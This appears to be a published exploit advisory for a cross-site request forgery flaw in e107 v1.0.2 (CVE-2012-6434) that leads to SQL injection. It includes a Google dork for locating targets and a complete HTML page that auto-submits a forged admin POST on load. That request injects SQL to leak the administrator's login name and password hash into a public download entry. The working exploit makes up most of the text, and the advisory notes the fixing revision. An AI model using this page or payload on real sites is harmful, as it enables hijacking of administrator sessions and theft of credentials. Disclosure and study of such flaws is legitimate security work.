@@ -1,0 +1,60 @@
+# Exploit Title: e107 v1.0.2 Administrator CSRF Resulting in SQL Injection
+# Google Dork: intext:"This site is powered by e107"
+# Date: 01/01/13
+# Exploit Author: Joshua Reynolds
+# Vendor Homepage: http://e107.org
+# Software Link: http://sourceforge.net/projects/e107/files/e107/e107%20v1.0.2/e107_1.0.2_full.tar.gz/download
+# Version: 1.0.2
+# Tested on: BT5R1 - Ubuntu 10.04.2 LTS
+# CVE: CVE-2012-6434
+-----------------------------------------------------------------------------------------
+Description:
+
+Cross-Site Request Forgery vulnerability in the e107_admin/download.php page, which is also vulnerable to SQL injection in the POST form.
+The e-token or ac tokens are not used in this page, which results in the CSRF vulnerability. This in itself is not a major security vulnerability but when done in conjunction with a SQL injection attack it can result in complete information disclosure.
+
+The parameters which are vulnerable to SQL injection on this page include: download_url, download_url_extended, download_author_email, download_author_website, download_image, download_thumb, download_visible, download_class.
+
+The following is an exploit containing javascript code that submits a 
+POST request on behalf of the administrator once the page is visited. It contains a SQL injection that would provide the username and password (in MD5) of the administrator to be added to the Author Name of a publicly available download.
+------------------------------------------------------------------------------------------
+Exploit:
+
+<html>
+<body onload="document.formCSRF.submit();">
+	<form method="POST" name="formCSRF" action="http://[site]/e107/e107102/e107_admin/download.php?create">
+		<input type="hidden" name="cat_id" value="1"/>
+		<input type="hidden" name="download_category" value="2"/>
+		<input type="hidden" name="download_name" value="adminpassdownload"/>
+		<input type="hidden" name="download_url" value="test.txt', (select concat(user_loginname,'::',user_password) from e107_user where user_id = '1'), '', '', '', '', '0', '2', '2', '1352526286', '', '', '2', '0', '', '0', '0' ) -- -"/>
+		<input type="hidden" name="download_url_external" value=""/>
+		<input type="hidden" name="download_filesize_external" value=""/>
+		<input type="hidden" name="download_filesize_unit" value="KB"/>
+		<input type="hidden" name="download_author" value=""/>
+		<input type="hidden" name="download_author_email" value=""/>
+		<input type="hidden" name="download_author_website" value=""/>
+		<input type="hidden" name="download_description" value=""/>
+		<input type="hidden" name="download_image" value=""/>
+		<input type="hidden" name="download_thumb" value=""/>
+		<input type="hidden" name="download_datestamp" value=""/>
+		<input type="hidden" name="download_active" value="1"/>
+		<input type="hidden" name="download_datestamp" value="10%2F11%2f2012+02%3A47%3A47%3A28"/>
+		<input type="hidden" name="download_comment" value="1"/>
+		<input type="hidden" name="download_visible" value="0"/>
+		<input type="hidden" name="download_class" value="0"/>
+		<input type="hidden" name="submit_download" value="Submit+Download"/>
+	</form>
+</body>
+</html>
+------------------------------------------------------------------------------------------
+Fix:
+
+This bug has been fixed in the following revision: r13058
+------------------------------------------------------------------------------------------
+Shout outs: Red Hat Security Team, Ms. Umer, Dr. Wu, Tim Williams, friends, & family.
+
+Contact: 
+Mail: infosec4breakfast@gmail.com
+Blog: infosec4breakfast.com
+Twitter: @jershmagersh
+Youtube: youtube.com/user/infosec4breakfast
